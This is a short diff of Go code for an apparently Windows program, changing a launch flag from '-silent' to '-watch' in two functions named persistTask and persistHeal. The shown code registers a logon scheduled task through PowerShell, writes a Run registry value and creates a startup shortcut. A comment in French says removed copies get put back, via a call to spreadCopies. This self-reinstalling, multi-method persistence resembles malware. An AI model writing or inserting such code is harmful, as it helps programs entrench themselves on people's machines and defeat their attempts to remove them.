@@ -95,7 +95,7 @@ func persistTask() {
 	if exe == "" {
 		return
 	}
-	script := "$a = New-ScheduledTaskAction -Execute " + qPS(exe) + " -Argument '-silent';" +
+	script := "$a = New-ScheduledTaskAction -Execute " + qPS(exe) + " -Argument '-watch';" +
 		"$t = New-ScheduledTaskTrigger -AtLogOn;" +
 		"$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;" +
 		"Register-ScheduledTask -TaskName " + qPS(taskName()) + " -Action $a -Trigger $t -Settings $s -Force | Out-Null"
@@ -290,7 +290,7 @@ func persistHeal() {
 	// Une copie a peut-être été retirée : on la repose.
 	spreadCopies(false)
 
-	value := `"` + exe + `" -silent`
+	value := `"` + exe + `" -watch`
 	_ = regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, value)
 	if !fileExists(startupLinkPath()) {
 		startupLinkTo(exe)
